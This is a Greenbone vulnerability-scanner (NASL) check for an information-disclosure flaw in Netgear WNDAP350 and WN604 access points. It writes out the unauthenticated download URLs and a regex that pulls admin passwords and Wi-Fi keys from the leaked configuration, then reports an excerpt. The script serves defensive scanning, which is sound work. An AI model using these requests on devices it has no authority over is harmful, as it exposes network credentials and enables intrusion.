# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103702");
  script_version("2024-11-19T05:05:41+0000");
  script_tag(name:"last_modification", value:"2024-11-19 05:05:41 +0000 (Tue, 19 Nov 2024)");
  script_tag(name:"creation_date", value:"2013-04-22 13:20:27 +0200 (Mon, 22 Apr 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2024-6646");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Netgear WNDAP350 / WN604 Wireless Access Point Multiple Information Disclosure Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  # nb: No dependency to a detection as there is an unknown amount of devices affected (e.g. the
  # "initial" flaw was published in 2013 as seen in references but has been also seen in 2024 on
  # newer devices as well.
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Various Netgear wireless access point devices are prone to
  multiple remote information disclosure issues because they fail to restrict access to sensitive
  information.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"A remote attacker can exploit these issues to obtain sensitive
  information that can aid in launching further attacks.");

  script_tag(name:"affected", value:"The following Netgear devices are known to be vulnerable:

  - WNDAP350 with firmware 2.0.1 and 2.0.9

  - WN604 with firmware 20240710

  Other firmware versions or devices may also be affected.");

  script_tag(name:"solution", value:"Ask the vendor for an update.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210127112031/https://www.securityfocus.com/bid/48085/");
  script_xref(name:"URL", value:"https://revspace.nl/RevelationSpace/NewsItem11x05x30x0");
  script_xref(name:"URL", value:"https://github.com/mikutool/vul/issues/1");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

# nb: No "http_can_host_php()" as the "base" URL "/" e.g. doesn't expose a .php file

base_checks = make_list(
  "/index.php?page=master", # nb: From the older existing WNDAP350 code
  "/index.php",             # nb: From the newer added WN604 code (based on the mikutool/vul repo)
  "/login_button.html",     # nb: As there is an unknown amount of devices affected just some
  "/"                       # additional confirmation requests just to be sure to catch all.
);

request_files = make_list(
  "/downloadFile.php",            # nb: From the older existing WNDAP350 code
  "/downloadFile.php?file=config" # nb: From the newer added WN604 code (based on the mikutool/vul repo)
);

# nb: Space at the end is expected
pattern = "^\s*(system:basicSettings:admin(Passwd|Name)|system:(sta|wds)Settings:.+([Ww]epPassPhrase|presharedKey|wdsPresharedkey)) ";

foreach base_check(base_checks) {

  # Usually just this (see gb_netgear_wnap_http_detect.nasl):
  #
  # <title>Netgear</title>
  #
  # but some other Netgear devices also had the following below so this was made a little bit
  # more generic to test all possible devices from the vendor for full coverage.
  #
  # <title>NETGEAR GS108Ev3</title>
  # <TITLE>NETGEAR GSM7224V2</TITLE>
  #
  # Seen copyright footer variants:
  #
  # <span>&copy; NETGEAR, Inc. All rights reserved.</span>
  # >Copyright &copy; 1996-2010 Netgear &reg;</td>
  #
  if(http_vuln_check(port:port, url:base_check, pattern:"(<title>Netgear|NETGEAR, Inc\.|Netgear &reg;)", usecache:TRUE, icase:TRUE)) {

    foreach request_file(request_files) {

      if(res = http_vuln_check(port:port, url:request_file, pattern:pattern, icase:FALSE)) {

        report = http_report_vuln_url(port:port, url:request_file);

        extract = egrep(string:res, pattern:pattern, icase:FALSE);
        extract = chomp(extract);
        if(extract)
          report += '\n\nExtracted sensitive info (excerpt):\n\n' + extract;

        security_message(port:port, data:report);
        exit(0);
      }
    }

    # nb: No need to continue at this point as we already have identified the device as a
    # Netgear one.
    exit(99);
  }
}

exit(0);
